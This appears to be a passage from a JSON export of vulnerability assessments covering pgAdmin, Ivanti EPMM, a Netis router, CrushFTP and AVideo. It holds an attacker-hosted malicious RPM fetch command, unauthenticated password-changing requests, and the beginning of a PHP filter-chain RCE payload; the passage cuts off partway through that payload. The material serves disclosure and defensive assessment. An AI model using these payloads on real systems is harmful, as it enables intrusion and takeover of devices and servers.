      "document": "pgAdmin is vulnerable to a multi-factor authentication bypass ([CWE-287](https://cwe.mitre.org/data/definitions/287.html)) whereby an attacker with knowledge of an account\u2019s credentials can manage files and make SQL queries regardless of whether or not the account has been configured with MFA. This vulnerability has a CVSS v3 score of 6.4 with a vector of AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N.\r\n\r\n# Exploitation\r\nAn attacker with knowledge of a legitimate account\u2019s username and password may authenticate to the application and perform sensitive actions within the application, such as managing files and executing SQL queries regardless of the account\u2019s MFA enrollment status.\r\n\r\npgAdmin4 is a rewrite of the original application in Python and has evolved into pgAdmin4 version 8.5 (the latest version as of when this vulnerability was discovered). The application is written using the [Flask web framework](https://flask.palletsprojects.com/en/3.0.x/) and uses common Flask patterns such as blueprints, which is a web application component that may include one or more resource handlers called \u201cviews\u201d.\r\n\r\nUpon normal authentication, an MFA-enabled user is granted a session without the `mfa_authenticated` key. pgAdmin then offers an [mfa_required](https://github.com/pgadmin-org/pgadmin4/blob/c90508cececf5e9cfb0eff87d0b1e9a0c9ed748f/web/pgadmin/authenticate/mfa/utils.py#L246) decorator that must be applied to individual Flask views in order to be protected. Once the username and password are validated, the session object itself is valid, meaning each view must opt into MFA authentication as opposed to being required to create a valid and authenticated session. The main view of the [browser blueprint](https://github.com/pgadmin-org/pgadmin4/blob/c90508cececf5e9cfb0eff87d0b1e9a0c9ed748f/web/pgadmin/browser/__init__.py#L366) opts into MFA authentication. The `/browser/` resource is the default location a newly authenticated user is redirected to. When this view is rendered by Flask, the MFA authentication status is checked and the user is prompted to enter their OTP.\r\n\r\nIf, however, the user has automated the necessary HTTP requests, there is nothing stopping them from using their authenticated session and accessing other parts of the application including the [file manager](https://github.com/pgadmin-org/pgadmin4/blob/c90508cececf5e9cfb0eff87d0b1e9a0c9ed748f/web/pgadmin/misc/file_manager/__init__.py#L187) and [SQL editor](https://github.com/pgadmin-org/pgadmin4/blob/master/web/pgadmin/tools/sqleditor/__init__.py#L164) blueprints. These two resources, along with others, only require an authenticated session, effectively ignoring the account\u2019s MFA requirement.\r\n\r\n# Impact\r\nAn attacker is able to leverage an MFA-enabled account with only knowledge of its username and password to execute SQL queries and manage files. It should be noted that the file manager does not have full access to the root file system by default but is commonly used to store SQL related data files.\r\n\r\nThis vulnerability was fixed in [pgAdmin 8.6](https://www.pgadmin.org/docs/pgadmin4/latest/release_notes_8_6.html) by commit [f4761f5](https://github.com/pgadmin-org/pgadmin4/commit/f4761f55f7cf6d56d6c5129f921393b0b47fd976).",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "4a8895bf-6532-45bf-bdbb-fea7a9705d34",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "e7825d9f-3c7e-4a7c-a926-bce6ec7fabd7",
      "created": "2024-05-09T14:56:12.800782Z",
      "revisionDate": "2024-05-09T14:56:12.79952Z",
      "document": "Rapid7 pen testers have noted they have encountered vulnerable versions of this software on engagements. ",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "7f7b046e-eae8-4ef0-940e-eb49334c203e",
      "editorId": "38eb0adc-fa4e-492e-91a1-3230840da026",
      "topicId": "b05620a8-15ae-4b38-9311-8081500d2630",
      "created": "2024-05-15T11:52:28.149341Z",
      "revisionDate": "2024-05-17T01:39:21.243851Z",
      "document": "CVE-2024-22026 is a local privilege escalation vulnerability in Ivanti EPMM (formerly MobileIron) server versions prior to 12.1.0.0, 12.0.0.0, and 11.12.0.1. This vulnerability allows a local attacker to gain root access to the system by exploiting the software update process with a malicious RPM package from a remote URL.\r\n\r\nThe appliance uses the following command to fetch and install RPM packages as a low privilege user. This of course means you must have CLI access:\r\n```sh\r\ninstall rpm url <remote url>\r\n```\r\nThis above command is only a CLI wrapper for the following to occur which runs as root\r\n```sh\r\n/bin/rpm -Uvh *.rpm\r\n```\r\nThis underlying rpm command does not enforce any signature verification or URL filtering, meaning any RPM package can be installed. This allows an attacker to forge and deliver a malicious RPM package that can compromise the appliance.\r\n\r\nSo you can root the appliance by hosting a malicious RPM with whatever commands you want, then fetch it using the standard update command on the Ivanti EPMM CLI, and your commands will run as root.\r\n```\r\ninstall rpm url http://<attacker_IP>/malicious.rpm\r\n```\r\n\r\nI have provided a POC here:\r\nhttps://www.redlinecybersecurity.com/blog/exploiting-cve-2024-22026-rooting-ivanti-epmm-mobileiron-core\r\n\r\n",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "46f2ab9e-5758-48a6-8c91-50f57afef149",
      "editorId": "1f5c188b-76fd-4e84-b90e-cadaa8bdcd26",
      "topicId": "f663a641-1dcc-4196-9477-9cf8ab5a5b75",
      "created": "2024-05-16T15:48:06.246489Z",
      "revisionDate": "2024-05-16T15:48:06.244141Z",
      "document": "",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Collection",
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "1671c0a1-d996-4224-8034-3782acdb3bad",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "1f9a291a-bc41-476c-9b62-e4aa59048a20",
      "created": "2024-05-19T11:47:46.622822Z",
      "revisionDate": "2024-07-31T10:51:54.759584Z",
      "document": "Netis Systems Co., Ltd is a global leading provider of networking products and solutions in the data communication industry. It has three worldwide independent brands \u201cnetis\u201d, \u201cnetcore\u201d and \u201cstonet\u201d .Product lines of Netis company includes Wireless routers, Access point wireless adapters, Dump switches, POE switches, Industrial switches, etc.\r\n\r\nA critical security vulnerability has been identified in the Netis router MW5360 by security researcher `adhikara13`. This vulnerability results in a Blind Command Injection in the \"password\" parameter, leading to unauthorized access. \r\n`Adhikara13` shared details in a POC on Github how to exploit this vulnerability which can be found [here](https://github.com/adhikara13/CVE/blob/main/netis_MW5360/blind%20command%20injection%20in%20password%20parameter%20in%20initial%20settings.md).\r\n\r\nA more detailed analysis on vulnerability is not available so I did some reverse engineering on the firmware to understand the details of this vulnerability. So I download the latest firmware `MW5360-1.0.1.3442` from [here](https://www.netisru.com/Suppory/de_details/id/1/de/136.html) which is a very recent release from April 2024 that is still vulnerable :-(.\r\nI emulated the firmware using `FirmAE` and used `burpsuite` to catch the requests to understand what was going on.\r\n\r\nOn the initial startup of the router, it will show you a welcome message and a setup screen to configure the router administration password and wifi settings including the wifi password which is the same as the administration password.\r\nCapturing this request with `burpsuite` already shows the first design flaw, because this POST request can be executed multiple times without any authentication where the wifi password and administration password can be changed by manipulating the `password` and `wpaPsk` field.\r\n\r\n**POST Request**\r\n```html\r\nPOST /cgi-bin/skk_set.cgi HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: 201\r\nAccept: text/plain, */*; q=0.01\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://192.168.1.1\r\nReferer: http://192.168.1.1/guide/welcome.html\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\nwlanMode=0&wl_idx=0&ssid2g=bmV0aXMtMDAwMDAw&encrypt=4&wpaPsk=SWwwdmVoYWNraW5n&wpaPskType=2&wpaPskFormat=0&password=SWwwdmVoYWNraW5n&autoUpdate=0&firstSetup=1&quick_set=ap&app=wan_set_shortcut&wl_link=0\r\n```\r\n**Successful Response**\r\n```html\r\nHTTP/1.1 200 OK\r\nDate: Sun, 02 Jun 2024 12:20:24 GMT\r\nServer: Boa/0.94.14rc21\r\nConnection: close\r\n\r\n[\"SUCCESS\"]\r\n```\r\nYou can even modify the request to only manipulate the router administration password by stripping the wifi parameters  from the request.\r\n```html\r\nPOST /cgi-bin/skk_set.cgi HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: 59\r\nAccept: text/plain, */*; q=0.01\r\nX-Requested-With: XMLHttpRequest\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nOrigin: http://192.168.1.1\r\nReferer: http://192.168.1.1/guide/welcome.html\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\npassword=SWwwdmVoYWNraW5n&quick_set=ap&app=wan_set_shortcut\r\n```\r\nSo far, so good, but besides this authentication bypass, there is also a blind command injection vulnerability in the password parameter according to CVE description.\r\n\r\nTo understand this a bit better, we need to dig into the firmware code.\r\nIf you login in into the emulated router software, you will find the main web binary `netis.cgi` in `/bin`. This is a compiled MIPS ELF binary so we need a tool like `ghidra` to decompile and understand the code.\r\n\r\nLoading and analyzing `netis.cgi` in `ghidra` shows that the main program is a wrapper that runs the specific `cgi` request calls like our `skk_set.cgi` that we can see with `burpsuite` when interacting with the Netis web interface.\r\n```C\r\nundefined4 main(undefined4 param_1,char **param_2)\r\n\r\n{\r\n  bool bVar1;\r\n  size_t sVar2;\r\n  int iVar3;\r\n  char *pcVar4;\r\n  char *local_188;\r\n  int local_184;\r\n  int local_17c;\r\n  void *local_160;\r\n  char acStack_15c [256];\r\n  char cStack_5c;\r\n  char acStack_5b [63];\r\n  int local_1c;\r\n  char *local_18 [4];\r\n  \r\n  local_160 = (void *)0x0;\r\n  memset(&cStack_5c,0,0x40);\r\n  local_1c = 0;\r\n  sVar2 = strlen(*param_2);\r\n  while (local_1c < (int)sVar2) {\r\n    memset(&cStack_5c,0,0x40);\r\n    iVar3 = local_1c;\r\n    FUN_0040670c((int)*param_2,'/',&local_1c);\r\n    strncpy(&cStack_5c,*param_2 + iVar3,local_1c - iVar3);\r\n    do {\r\n      local_1c = local_1c + 1;\r\n    } while ((*param_2)[local_1c] == '/');\r\n  }\r\n  local_188 = &cStack_5c;\r\n  bVar1 = false;\r\n  local_18[0] = \"skk_set.cgi\";\r\n  local_18[1] = \"upload_config.cgi\";\r\n  local_18[2] = \"upload_fw.cgi\";\r\n  local_18[3] = (char *)0x0;\r\n  local_17c = 0;\r\n  do {\r\n    if (local_18[local_17c] == (char *)0x0) {\r\nLAB_00405408:\r\n      if (bVar1) {\r\n        iVar3 = open(\"/tmp/lock_all.lock\",0x702,0x1b4);\r\n        if (iVar3 < 0) {\r\n          local_184 = FUN_004050fc();\r\n          if (local_184 < 0) {\r\n            local_184 = 0;\r\n          }\r\n          FUN_00405060(local_184);\r\n          if (2 < local_184) {\r\n            system(\"rm -rf /tmp/lock_all.lock\");\r\n            FUN_00405060(0);\r\n          }\r\n          printf(\"[\\\"LOCK\\\"]\");\r\n          return 0;\r\n        }\r\n        close(iVar3);\r\n      }\r\n      apmib_init();\r\n      FUN_00422c38(&local_160,param_2[1]);\r\n      DAT_00440d40 = FUN_00405190();\r\n      if (local_188 == (char *)0x0) {\r\n        iVar3 = access(\"/tmp/lock_all.lock\",0);\r\n        if (iVar3 == 0) {\r\n          system(\"rm -rf /tmp/lock_all.lock\");\r\n        }\r\n        FUN_004214cc(&local_160);\r\n        printf(\"[\\\"%d\\\"]\",999);\r\n      }\r\n      else {\r\n        pcVar4 = strstr(local_188,\".cgi\");\r\n        if (pcVar4 != (char *)0x0) {\r\n          pcVar4 = strchr(local_188,0x2f);\r\n          if (pcVar4 != (char *)0x0) {\r\n            local_188 = acStack_5b;\r\n          }\r\n          FUN_00405764(local_188,&local_160,acStack_15c);\r\n        }\r\n        fflush(stdout);\r\n        FUN_004214cc(&local_160);\r\n        iVar3 = access(\"/tmp/lock_all.lock\",0);\r\n        if (iVar3 == 0) {\r\n          system(\"rm -rf /tmp/lock_all.lock\");\r\n        }\r\n        FUN_00405060(0);\r\n      }\r\n      return 0;\r\n    }\r\n    iVar3 = strcmp(local_188,local_18[local_17c]);\r\n    if (iVar3 == 0) {\r\n      bVar1 = true;\r\n      goto LAB_00405408;\r\n    }\r\n    local_17c = local_17c + 1;\r\n  } while( true );\r\n}\r\n```\r\nLet's check the code for the `password` string and see where is it used. You can do this by using the search function in `ghidra`.\r\nThis creates quite some hits, but the most interesting hit is the `ex_password` variable which seems to be linked to a script `/bin/script/password.sh`\r\n```C\r\n                             ex_password                                     XREF[2]:     Entry Point(*), \r\n                                                                                          FUN_0041301c:00413180(*)  \r\n        0043be44 2f 62 69        ds         \"/bin/script/password.sh\"\r\n                 6e 2f 73 \r\n                 63 72 69 \r\n```\r\nChecking out function `FUN_0041301c:00413180(*) ` shows `ex_password` a.k.a. `/bin/script/password,sh` is being called by the function `FUN_00402e00(\"%s > /dev/console\",ex_password,pcVar1,param_4);`.\r\n\r\n```C\r\nundefined4 FUN_0041301c(undefined4 *param_1,undefined4 param_2,char *param_3,undefined4 param_4)\r\n\r\n{\r\n  char *pcVar1;\r\n  byte *pbVar2;\r\n  byte abStack_8c [132];\r\n  \r\n  pcVar1 = FUN_00405644(param_1,\"usb3gEnabled\");\r\n  if (pcVar1 != (char *)0x0) {\r\n    FUN_00405644(param_1,\"usb3gPinCode\");\r\n    param_3 = FUN_00405644(param_1,\"usb3gApn\");\r\n    param_4 = 0;\r\n    FUN_00412fe4();\r\n    FUN_00402e00(\"%s > /dev/console\",ex_usbcontrol,param_3,param_4);\r\n  }\r\n  pbVar2 = (byte *)FUN_00405644(param_1,\"ssid2g\");\r\n  if (pbVar2 != (byte *)0x0) {\r\n    FUN_004030f4(abStack_8c,pbVar2);\r\n    strcpy((char *)(pMib + 0x42c1),(char *)abStack_8c);\r\n  }\r\n  FUN_00402e00(\"echo 0 > %s\",\"/proc/http_redirect/enable\",param_3,param_4);\r\n  memset(abStack_8c,0,0x80);\r\n  apmib_get(0x159,abStack_8c);\r\n  pcVar1 = \"/proc/rtl_dnstrap/domain_name\";\r\n  FUN_00402e00(\"echo \\'%s\\' > %s\",abStack_8c,\"/proc/rtl_dnstrap/domain_name\",param_4);\r\n  FUN_00402e00(\"%s > /dev/console\",ex_password,pcVar1,param_4);\r\n  FUN_00402e00(\"%s > /dev/console\",param_2,pcVar1,param_4);\r\n  return 0;\r\n}\r\n```\r\nInteresting, but lets check if this code segment really gets executed if we run the POST request again. A quick trick is to monitor the process list on the router and grep the relevant processes during the execution of the POST request.\r\n```shell\r\n# while true; do ps|grep -e password.sh -e rtl -e http_redirect|grep -v grep;done\r\n 3518 root      1132 R    /bin/sh -c echo 0 > /proc/http_redirect/enable\r\n 3520 root      1132 R    /bin/sh -c echo 'netis.cc' > /proc/rtl_dnstrap/domain\r\n 3531 root      1140 S    /bin/sh -c /bin/script/password.sh > /dev/console\r\n 3538 root       324 R    /bin/script/password.sh\r\n 3531 root      1140 S    /bin/sh -c /bin/script/password.sh > /dev/console\r\n 3538 root      1656 S    /bin/script/password.sh\r\n```\r\nAnd indeed `/bin/script/password.sh` gets executed as well as some other commands listed in the code.\r\n\r\nSo let's now focus on the `/bin/scripts/password.sh`. \r\nChecking out this shell script, it turns out to be a compiled MIPS ELF binary instead of a text readable unix shell script. \r\n\r\nLet's use `ghidra` again to decompile this binary and use the search function to look for the `password` string.\r\nAgain quite some hits, but then I stumble over a very interesting piece of code.\r\n```C\r\n                             s_Changed_Username_and_Password_.._0041dc80     XREF[1]:     FUN_00409590:0040969c(*)  \r\n        0041dc80 43 68 61        ds         \"Changed Username and Password ...........\\n\"\r\n                 6e 67 65 \r\n                 64 20 55 \r\n```\r\nThis is most likely the code section that sets the router administration password.\r\n\r\nChecking out the function `FUN_00409590` is revealing two major issues.\r\n```C\r\nvoid FUN_00409590(void)\r\n\r\n{\r\n  undefined auStack_488 [64];\r\n  undefined auStack_448 [64];\r\n  undefined auStack_408 [1024];\r\n  \r\n  memset(auStack_408,0,0x400);\r\n  memset(auStack_488,0,0x40);\r\n  memset(auStack_448,0,0x40);\r\n  apmib_get(0x15d,auStack_488);\r\n  apmib_get(0x15e,auStack_448);\r\n  RunSystemCmd(\"echo \\\"root::0:0:root:/:/bin/sh\\\" > /var/passwd\");\r\n  RunSystemCmd(\"echo \\\"nobody:x:0:0:nobody:/:/dev/null\\\" >> /var/passwd\");\r\n  RunSystemCmd(\"echo root:%s | chpasswd -m\",auStack_448);\r\n  RunSystemCmd(\"echo \\\"root:x:0:root\\\" > /var/group\");\r\n  RunSystemCmd(\"echo \\\"nobody:x:0:nobody\\\" >> /var/group\");\r\n  RunSystemCmd(\"chmod 755 /var/passwd\");\r\n  RunSystemCmd(\"chmod 755 /var/group\");\r\n  fwrite(\"Changed Username and Password ...........\\n\",1,0x2a,stderr);\r\n  return;\r\n}\r\n```\r\nThe first issue is that the router administration password is directly linked to the root password of router itself. \r\nOeps! That is not really best practice and attackers love these things.\r\n\r\nThe second issue is the blind command injection where the vulnerable code `RunSystemCmd(\"echo root:%s | chpasswd -m\",auStack_448);` allows an attacker to manipulate password argument represented by `auStack_448` and inject and execute code using the unix backtics.\r\nThis explains why the password parameter is indeed vulnerable of blind command injection.\r\n\r\nThe `RunSystemCmd` function is just a piece a code which is defined in the library `libapmib.so` and executes a unix command line using the `system()` call.\r\n```C\r\nvoid RunSystemCmd(char *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)\r\n\r\n{\r\n  undefined4 local_res4;\r\n  undefined4 local_res8;\r\n  undefined4 local_resc;\r\n  char acStack_118 [256];\r\n  undefined4 *local_18;\r\n  \r\n  local_res4 = param_2;\r\n  local_res8 = param_3;\r\n  local_resc = param_4;\r\n  memset(acStack_118,0,0x100);\r\n  local_18 = &local_res4;\r\n  vsprintf(acStack_118,param_1,local_18);\r\n  system(acStack_118);\r\n  return;\r\n}\r\n```\r\nI have created an exploit that is published as official module [Netis MW5360 unauthenticated RCE [CVE-2024-22729]](https://github.com/rapid7/metasploit-framework/pull/19188) in Metasploit.\r\nUnfortunately there is no mitigation, because the latest firmware from April 2024 is still vulnerable. So be on the alert when suddenly your router administration password changes unexpectedly and you can not login into your router anymore.\r\n\r\n## References\r\n[CVE-2024-22729](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-22729)\r\n[Netis MW5360 unauthenticated RCE [CVE-2024-22729]](https://github.com/rapid7/metasploit-framework/pull/19188)\r\n[Firmware MW5360-1.0.1.3442](https://www.netisru.com/Suppory/de_details/id/1/de/136.html)\r\n\r\n### Credits\r\nCredits go to the security researcher below who discovered this vulnerability.\r\n* `adhikara13`\r\n\r\n",
      "score": 3,
      "metadata": {
        "mitre-tactics": "Execution",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "372ce344-cefb-4da1-8ba7-faf072bf4841",
      "editorId": "23b070fe-f794-4907-b885-8b1f272c3f68",
      "topicId": "e9ab9d6b-7a7f-49e4-91b5-b8c07a1e430f",
      "created": "2024-05-20T20:32:07.091957Z",
      "revisionDate": "2024-05-20T20:32:07.089823Z",
      "document": "CVE-2023-43177: Critical Unauthenticated Remote Code Execution in CrushFTP\r\n\r\nOverview:\r\n\r\nCVE-2023-43177 is a critical vulnerability disclosed in August 2023, affecting CrushFTP servers prior to version 10.5.1. This vulnerability enables unauthenticated attackers to achieve remote code execution (RCE) on affected systems, leading to complete compromise.\r\n\r\nTechnical Details:\r\n\r\nThe vulnerability stems from an unauthenticated mass assignment flaw in how CrushFTP parses AS2 protocol headers. An attacker can manipulate these headers to gain arbitrary file read-and-delete access on the server's file system. By chaining this with other techniques, they can escalate privileges and execute arbitrary code with the permissions of the CrushFTP server process, typically resulting in root access.\r\n\r\nSeverity and Risk:\r\n\r\nThis vulnerability has been assigned a CVSS v3.1 base score of 9.8, classifying it as Critical. This high severity is due to:\r\n\r\nNo Authentication Required: Exploitation does not require any valid user credentials.\r\nRemote Exploitation: The attack can be launched remotely over the network.\r\nFull System Compromise: Successful exploitation leads to complete control of the affected server.\r\nAttacker Value and Exploitability Assessment:\r\n\r\nBased on a personal assessment, this vulnerability is rated as having high attacker value due to the potential for complete system compromise and the wide range of sensitive data that may be stored on file transfer servers. Additionally, the availability of public exploits and the straightforward exploitation process contribute to its easy exploitability.\r\n\r\nVerified Active Exploitation:\r\n\r\nWhile concrete public disclosures of widespread attacks are limited, several indicators point to active exploitation attempts:\r\n\r\nProof-of-Concept Exploits: Public PoC exploits exist, lowering the barrier to entry for attackers.\r\nSecurity Advisories: Multiple cybersecurity firms have issued advisories warning of active scanning and potential exploitation.\r\nConverge: https://convergetp.com/2023/11/16/crushftp-zero-day-cve-2023-43177-discovered/\r\nArctic Wolf: https://arcticwolf.com/resources/blog/cve-2023-43177/\r\nMetasploit Module: A Metasploit module for exploiting CVE-2023-43177 is available, making the attack more accessible to a wider range of threat actors.\r\nMitigation and Recommendations:\r\n\r\nPatch Immediately: Upgrade to CrushFTP version 10.5.1 or later.\r\nMonitor for Exploitation: Review server logs for unusual AS2 activity or unauthorized file access.\r\nTemporary Workarounds (if patching is not possible):\r\nDisable AS2 functionality.\r\nImplement a web application firewall (WAF) with specific rules to block exploit attempts.\r\nConclusion:\r\n\r\nCVE-2023-43177 poses a severe risk to organizations using CrushFTP due to its high attacker value, easy exploitability, and evidence of active exploitation attempts. Immediate patching and additional security measures are crucial for mitigating this ongoing threat.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Lateral Movement",
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "982c48b6-69a7-4c4b-aa08-5c4ca5a482a3",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "2fbd70fc-f5ba-4934-be8d-1829dce58a84",
      "created": "2024-05-22T13:42:57.082183Z",
      "revisionDate": "2024-05-22T13:42:57.079224Z",
      "document": "[WWNB AVideo](https://github.com/WWBN/AVideo) is a versatile and advanced video streaming platform tailored for individual content creators, businesses, and developers alike. Versions v.12.4 through v.14.2 which have the WWNBIndex Plugin installed suffer from a Local File Inclusion vulnerability which can be used to obtain Remote Code Execution through the use of [PHP Filter Chaining](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it). For those unfamiliar with PHP Filter Chaining please reference the previous link or the AKB article for [CVE-2023-6553](https://attackerkb.com/assessments/2c58ed71-2d98-4aec-9b22-bb835fea1371) which goes into more detail of how the technique works.\r\n\r\nThe vulnerable line of code lives on line 6 of `/AVideo/plugin/WWBNIndex/submitIndex.php`:\r\n![image](https://github.com/rapid7/metasploit-framework/assets/23320005/5c27ec09-a4f1-48cb-80d9-491eb2186758)\r\n\r\nThe unfiltered POST request parameter `systemRootPath` gets directly used in a `require_once` statement which is normally just an LFI but by leveraging PHP Filter Chaining it can be turned into RCE. The vulnerable code can be accessed without authentication by hitting the following endpoint: `<target_uri.path>/plugin/WWBNIndex/submitIndex.php/`.  \r\n# PoC \r\n\r\nThe following POST request can be used to execute code on a vulnerable system. The POST request executes the following command: `ping 172.16.199.1` which is the IP address of my host machine.\r\n```\r\nPOST /AVideo/plugin/WWBNIndex/submitIndex.php HTTP/1.1\r\nHost: 172.16.199.131\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11884\r\n\r\nsystemRootPath=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7